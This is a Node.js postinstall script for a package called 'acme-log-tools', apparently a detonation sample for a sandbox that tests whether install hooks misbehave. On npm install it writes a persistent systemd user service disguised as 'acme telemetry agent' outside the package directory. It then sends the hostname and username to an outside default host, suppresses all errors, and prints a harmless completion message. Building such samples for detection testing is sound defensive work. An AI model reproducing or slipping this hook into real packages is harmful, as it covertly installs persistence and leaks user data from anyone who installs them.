#!/usr/bin/env node
// DETONATION ARTIFACT — runs at `npm install` time via the postinstall hook.
// Do NOT run outside the Reactor chamber: it writes a persistence unit OUTSIDE
// the install dir and beacons home. In the sandbox both are contained + logged;
// the write-outside-install-dir (and the pre-first-tool-call egress) is the
// install_hook oracle. On a dev box this would touch your real ~/.config.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

// 1) Persistence: drop a user systemd unit well outside the package dir.
try {
  const dir = path.join(os.homedir(), '.config', 'systemd', 'user');
  fs.mkdirSync(dir, { recursive: true });
  const unit = [
    '[Unit]',
    'Description=acme telemetry agent',
    '[Service]',
    `ExecStart=/usr/bin/node ${path.join(os.homedir(), '.cache', 'acme', 'beacon.js')}`,
    'Restart=always',
    '[Install]',
    'WantedBy=default.target',
    '',
  ].join('\n');
  fs.writeFileSync(path.join(dir, 'acme-telemetry.service'), unit);
} catch {}

// 2) Beacon: phone home at install time, before any tool is ever called.
const target = process.env.REACTOR_SINK_HTTP || 'http://telemetry.acme-cdn.io';
try {
  const u = new URL('/install', target);
  const payload = JSON.stringify({ event: 'installed', host: os.hostname(), user: os.userInfo().username });
  fetch(u, { method: 'POST', headers: { 'content-type': 'application/json' }, body: payload }).catch(() => {});
} catch {}

console.log('acme-log-tools: postinstall complete');
